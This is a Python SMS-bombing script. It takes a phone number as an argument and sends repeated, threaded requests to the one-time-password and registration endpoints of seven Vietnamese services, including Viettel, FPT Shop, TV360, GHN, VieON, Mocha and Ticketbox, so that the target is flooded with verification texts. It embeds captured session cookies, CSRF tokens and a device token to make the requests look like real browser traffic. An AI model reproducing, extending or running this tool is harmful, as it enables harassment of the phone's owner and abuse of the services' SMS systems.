import requests,sys,time,json
from concurrent.futures import ThreadPoolExecutor
threading = ThreadPoolExecutor(max_workers=int(100000))
phone = sys.argv[1]


def myvietel():
    cookies = {
        'cookie_saleChannel0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI': 'eyJpdiI6IjNndVNDdGpOVzFkV2NSSUNQR2grZVE9PSIsInZhbHVlIjoiZVdWZkV6YWFSQlNhbm8zbVhJKzJEK0tIUDViQWxOZHJtTndcL0k5Y2JWS01MM2J2TEpOSitCWjE0N1RWMmswZ1lhUWhyOEtIYklKOHh0bVpkZVRFcFRyZDdCcEQwMW1Ma0U1em9yZ3czbVc5QlJLc1Nxd3BPZ0w3REJvU002b1ZnQUVGWnhvamE4akJXZFlmS0xzWnRrOGwxRXNCYVM5ZFwvS0Faam9ndnphWkswXC9vMmJhM0JWRndoaDljeGpoYUQ5bk84ZHRsYkdIZXlMOEVYZVwvdXdSQWc0N1czUks5SStwbDhjNFVkUjd0UjQ9IiwibWFjIjoiY2Q5YmY2OGQ1MjZhZjA5ODFhYzk1OWFkNTZlMDBiOWEzNzMxYTU3NGRlYzc0ZTljMDgwZTY1OTE4OTA5YzJlNCJ9',
        'laravel_session': '0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI',
        'redirectLogin': 'https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE',
        'XSRF-TOKEN': 'eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ%3D%3D',
    }

    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/json;charset=UTF-8',
        # 'Cookie': 'cookie_saleChannel0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI=eyJpdiI6IjNndVNDdGpOVzFkV2NSSUNQR2grZVE9PSIsInZhbHVlIjoiZVdWZkV6YWFSQlNhbm8zbVhJKzJEK0tIUDViQWxOZHJtTndcL0k5Y2JWS01MM2J2TEpOSitCWjE0N1RWMmswZ1lhUWhyOEtIYklKOHh0bVpkZVRFcFRyZDdCcEQwMW1Ma0U1em9yZ3czbVc5QlJLc1Nxd3BPZ0w3REJvU002b1ZnQUVGWnhvamE4akJXZFlmS0xzWnRrOGwxRXNCYVM5ZFwvS0Faam9ndnphWkswXC9vMmJhM0JWRndoaDljeGpoYUQ5bk84ZHRsYkdIZXlMOEVYZVwvdXdSQWc0N1czUks5SStwbDhjNFVkUjd0UjQ9IiwibWFjIjoiY2Q5YmY2OGQ1MjZhZjA5ODFhYzk1OWFkNTZlMDBiOWEzNzMxYTU3NGRlYzc0ZTljMDgwZTY1OTE4OTA5YzJlNCJ9; laravel_session=0m667giXuBHbfNGgr2R3tgN0UpU6INNPMMC55BHI; redirectLogin=https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE; XSRF-TOKEN=eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ%3D%3D',
        'Origin': 'https://viettel.vn',
        'Referer': 'https://viettel.vn/internet-truyenhinh/toan-trinh/?ch=DUYENNTC1_HCM_HKD&gclid=CjwKCAjw6p-oBhAYEiwAgg2PgpqUF1PipuENFbHvGYu6J7Vbocd5JxTg_B7dEwkvMBYfj2LBC9EEIhoCd-0QAvD_BwE',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'X-CSRF-TOKEN': 'IsFbAIu3zZCkbn7pkrrZnoTS4MaK7AXwvU7CKVGU',
        'X-Requested-With': 'XMLHttpRequest',
        'X-XSRF-TOKEN': 'eyJpdiI6InpSRGNNb1dtZ1czWEZlMFJcL2k5elhnPT0iLCJ2YWx1ZSI6InVidVduSjN3cWlIZjFKOFk4WFwvU0pnb0RKN0NCM3ZlMGp5NEJlTlhOSFdyeXp2Z3lHRWxUZ2xvWFlZVWdyXC9YYSIsIm1hYyI6IjliY2FmNTVjNDk0N2NmOTM1ZWM2NDE1ODRhY2Y4NWZiODU3M2Q0OGI0MTYwYmE5MDczZWFmNTA2OTA1Mzk5ZDMifQ==',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    json_data = {
        'msisdn': phone,
    }

    response = requests.post('https://viettel.vn/api/get-otp', cookies=cookies, headers=headers, json=json_data)
###
def fptshop():
    cookies = {
        'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc': '93565a20-d5bd-4b1d-921f-6b833256ae5a',
        '_gcl_au': '1.1.274895891.1694312337',
        'fpt_uuid': '%226f1d835a-1946-4291-a9ff-241e68bc2965%22',
        'ajs_group_id': 'null',
        '__zi': '3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfsmiKYNpVgANR31I0UfUWgjP95uHqcAUiDZGs.1',
        '_fbp': 'fb.2.1694312339667.1405504295',
        '__admUTMtime': '1694312339',
        '_tt_enable_cookie': '1',
        '_ttp': 'R2G1TDK2APp-wahdJlD64b-MjP_',
        '__iid': '',
        '__iid': '',
        '__su': '0',
        '__su': '0',
        '__RC': '59',
        '__R': '3',
        '_hjSessionUser_731679': 'eyJpZCI6ImRiNTJkYjEwLTE2NWMtNTcxZS05NDdkLWI5NzZhZWY2ODk1NSIsImNyZWF0ZWQiOjE2OTQzMTIzMzk2NDYsImV4aXN0aW5nIjp0cnVlfQ==',
        '__tb': '0',
        '__IP': '712264848',
        '_gid': 'GA1.3.872342835.1695128560',
        '_gat': '1',
        'vMobile': '1',
        '_ga': 'GA1.1.1813377516.1694312336',
        'cf_clearance': 'ilQ6k.2nVyGvZkL437P7skB9zv5GWtWlHZ9KduAAHf8-1695128562-0-1-60834c65.4b3697cc.37821385-0.2.1695128562',
        '_ga_ZR815NQ85K': 'GS1.1.1695128560.3.0.1695128561.59.0.0',
        '__rtbh.lid': '%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22LZP9yq8b913yis2cEPCF%22%7D',
        '_hjIncludedInSessionSample_731679': '0',
        '_hjSession_731679': 'eyJpZCI6ImViNTgxNTAwLTViNTktNGRkOC05MjVkLTIzZjg2NmFmOTZiMSIsImNyZWF0ZWQiOjE2OTUxMjg1NjIyMzEsImluU2FtcGxlIjpmYWxzZX0=',
        '_hjAbsoluteSessionInProgress': '0',
        '__uif': '__uid%3A8589680751712265079%7C__ui%3A1%252C6%7C__create%3A1689680751',
    }

    headers = {
        'Accept': '*/*',
        'Accept-Language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'Connection': 'keep-alive',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        # 'Cookie': 'log_6dd5cf4a-73f7-4a79-b6d6-b686d28583fc=93565a20-d5bd-4b1d-921f-6b833256ae5a; _gcl_au=1.1.274895891.1694312337; fpt_uuid=%226f1d835a-1946-4291-a9ff-241e68bc2965%22; ajs_group_id=null; __zi=3000.SSZzejyD7iu_cVEzsr0LpYAPvhoKKa7GR9V-_yX0Iyz-rUpfsmiKYNpVgANR31I0UfUWgjP95uHqcAUiDZGs.1; _fbp=fb.2.1694312339667.1405504295; __admUTMtime=1694312339; _tt_enable_cookie=1; _ttp=R2G1TDK2APp-wahdJlD64b-MjP_; __iid=; __iid=; __su=0; __su=0; __RC=59; __R=3; _hjSessionUser_731679=eyJpZCI6ImRiNTJkYjEwLTE2NWMtNTcxZS05NDdkLWI5NzZhZWY2ODk1NSIsImNyZWF0ZWQiOjE2OTQzMTIzMzk2NDYsImV4aXN0aW5nIjp0cnVlfQ==; __tb=0; __IP=712264848; _gid=GA1.3.872342835.1695128560; _gat=1; vMobile=1; _ga=GA1.1.1813377516.1694312336; cf_clearance=ilQ6k.2nVyGvZkL437P7skB9zv5GWtWlHZ9KduAAHf8-1695128562-0-1-60834c65.4b3697cc.37821385-0.2.1695128562; _ga_ZR815NQ85K=GS1.1.1695128560.3.0.1695128561.59.0.0; __rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22LZP9yq8b913yis2cEPCF%22%7D; _hjIncludedInSessionSample_731679=0; _hjSession_731679=eyJpZCI6ImViNTgxNTAwLTViNTktNGRkOC05MjVkLTIzZjg2NmFmOTZiMSIsImNyZWF0ZWQiOjE2OTUxMjg1NjIyMzEsImluU2FtcGxlIjpmYWxzZX0=; _hjAbsoluteSessionInProgress=0; __uif=__uid%3A8589680751712265079%7C__ui%3A1%252C6%7C__create%3A1689680751',
        'Origin': 'https://fptshop.com.vn',
        'Referer': 'https://fptshop.com.vn/',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
        'X-Requested-With': 'XMLHttpRequest',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
    }

    data = {
        'phone': phone,
        'typeReset': '0',
    }

    response = requests.post('https://fptshop.com.vn/api-data/loyalty/Login/Verification', cookies=cookies, headers=headers, data=data)
###
def tv360():
    cookies = {
        'acw_tc': '9aaf940a6cdcc4acd3e07b1b10c328880d214785e42ba285709248963ab8e7a5',
        'img-ext': 'avif',
        'NEXT_LOCALE': 'vi',
        'device-id': 's%3Aweb_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7.6ArWYearisaeiXLvpEQeILU0Rpeqo7JTv9xCClcNgJA',
        'shared-device-id': 'web_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7',
        'screen-size': 's%3A1280x720.%2Fl38KhYvKgwKxsNysIEM6VTkaAubb6utR0LoxEkjZsU',
        '_ga': 'GA1.2.2034489421.1694952395',
        '_gid': 'GA1.2.602838635.1694952395',
        'G_ENABLED_IDPS': 'google',
        'session-id': 's%3A863dae10-cab3-43c3-8dc8-947211574e72.LQTo2WBBjeNfjmkUhCA44gYfmlYX3SH68AZg2kSGzz0',
        '_ga_E5YP28Y8EF': 'GS1.1.1694952394.1.1.1694952571.0.0.0',
        '_ga_D7L53J0JMS': 'GS1.1.1694952394.1.1.1694952571.60.0.0',
    }
    headers = {
        'authority': 'tv360.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        # 'cookie': 'acw_tc=9aaf940a6cdcc4acd3e07b1b10c328880d214785e42ba285709248963ab8e7a5; img-ext=avif; NEXT_LOCALE=vi; device-id=s%3Aweb_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7.6ArWYearisaeiXLvpEQeILU0Rpeqo7JTv9xCClcNgJA; shared-device-id=web_a1c2745d-b0ed-44cf-9010-c6cc48b1f1f7; screen-size=s%3A1280x720.%2Fl38KhYvKgwKxsNysIEM6VTkaAubb6utR0LoxEkjZsU; _ga=GA1.2.2034489421.1694952395; _gid=GA1.2.602838635.1694952395; G_ENABLED_IDPS=google; session-id=s%3A863dae10-cab3-43c3-8dc8-947211574e72.LQTo2WBBjeNfjmkUhCA44gYfmlYX3SH68AZg2kSGzz0; _ga_E5YP28Y8EF=GS1.1.1694952394.1.1.1694952571.0.0.0; _ga_D7L53J0JMS=GS1.1.1694952394.1.1.1694952571.60.0.0',
        'origin': 'https://tv360.vn',
        'referer': 'https://tv360.vn/login?r=https%3A%2F%2Ftv360.vn%2F',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'starttime': '1694952571324',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    }
    json_data = {
        'msisdn': phone,
    }
    response = requests.post('https://tv360.vn/public/v1/auth/get-otp-login', cookies=cookies, headers=headers, json=json_data)
###
def ghn():
    headers = {
        'authority': 'online-gateway.ghn.vn',
        'accept': 'application/json, text/plain, */*',
        'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
        'content-type': 'application/json',
        'origin': 'https://sso.ghn.vn',
        'referer': 'https://sso.ghn.vn/',
        'sec-ch-ua': '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
        'sec-ch-ua-mobile': '?1',
        'sec-ch-ua-platform': '"Android"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; Nexus 5 Build/MRA58N) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
}   

    json_data = {
        'phone': phone,
        'type': 'register',
}   

    response = requests.post('https://online-gateway.ghn.vn/sso/public-api/v2/client/sendotp', headers=headers, json=json_data)
###
def vieon():
  data = f'phone_number={phone}&password=1262007Gdtg&given_name=&device_id=688e6ab3da160a362df3805047548504&platform=mobile_web&model=Android%208.1.0&push_token=&device_name=Chrome%2F114&device_type=desktop&isMorePlatform=true&ui=012021'
  head = {
    "Host":"api.vieon.vn",
    "accept":"application/json, text/plain, */*",
    "user-agent":"Mozilla/5.0 (Linux; Android 8.1.0; Redmi 5A Build/OPM1.171019.026) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.130 Mobile Safari/537.36",
    "content-type":"application/x-www-form-urlencoded",
    "x-requested-with":"mark.via.gp",
    "sec-fetch-site":"same-site",
    "sec-fetch-mode":"cors",
    "sec-fetch-dest":"empty",
    "referer":"https://vieon.vn/",
    "accept-encoding":"gzip, deflate, br",
}
  rq = requests.post("https://api.vieon.vn/backend/user/register/mobile?platform=mobile_web&ui=012021",data=data,headers=head).json()

def mocha():
  headers = {
    'Accept': 'application/json, text/plain, */*',
    'Accept-Language': 'vi,vi-VN;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
    'Connection': 'keep-alive',
    # 'Content-Length': '0',
    'Origin': 'https://video.mocha.com.vn',
    'Referer': 'https://video.mocha.com.vn/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-site',
    'User-Agent': 'Mozilla/5.0 (Linux; Android 8.0.0; SM-G955U Build/R16NW) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
  }

  params = {
    'msisdn': phone,
    'languageCode': 'vi',
  }

  response = requests.post('https://apivideo.mocha.com.vn/onMediaBackendBiz/mochavideo/getOtp', params=params, headers=headers)


def ticketbox():
    headers = {
        'authority': 'api-movie.ticketbox.vn',
        'accept': '*/*',
        'accept-language': 'en',
        'content-type': 'application/json',
        'origin': 'https://ticketbox.vn',
        'referer': 'https://ticketbox.vn/',
        'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-site',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
        'x-tb-access-token': '',
        'x-tb-device-token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJhcGkudGlja2V0Ym94LnZuIiwiZXhwIjoxNzA5Mzg1ODQ4LCJpYXQiOjE3MDY3OTM4NDgsImlzcyI6ImlkZW50aXR5LnRpY2tldGJveC52biIsImRldmljZV9pZCI6Ijc1NDZiOGQ2MTZlZmZiMGRkYzM4ZDkwMjZjNDBiODdjIiwia2luZCI6ImRldmljZV90b2tlbiJ9.OixOgmL5bam8rPSTod85ScuPnHOweHFVq-bs9-YDGAJjExQFbxyOADysQZF7tZqQiL-2-4SAVAQFIfRDw-n6Ol505YubLfu-TSQ9huaslwLifinr3s5CpBeiCyLaM9sQk1oNQiXvGQ48YWzeqM2-PiSoXfa_bnBiiIThpHHBSQyjKqz6QJaWMx6boN8W4iYGyh0pVCu_5Gtu0YgWU6p6H7fFB8O3YWF93qAa9100gGLIfZ4s3FWBICN1wo_YLkPqV1s-dvv0OgLaloVL9qH5NDAEwdsq596AmnQbNdEMY8Q7Ko-nEMfW0FJ_BpvHtTxE6hKTTwOsRLDbCo2SnOXV7g',
    }

    json_data = {
        'phone': '+84'+phone[1:10],
    }

    response = requests.post('https://api-movie.ticketbox.vn/v1/users/otps/send', headers=headers, json=json_data)
for i in range(5):      
    threading.submit(myvietel)
    threading.submit(fptshop)
    threading.submit(tv360)
    threading.submit(mocha)
    time.sleep(1)
    threading.submit(ghn)
    threading.submit(vieon)
    threading.submit(ticketbox)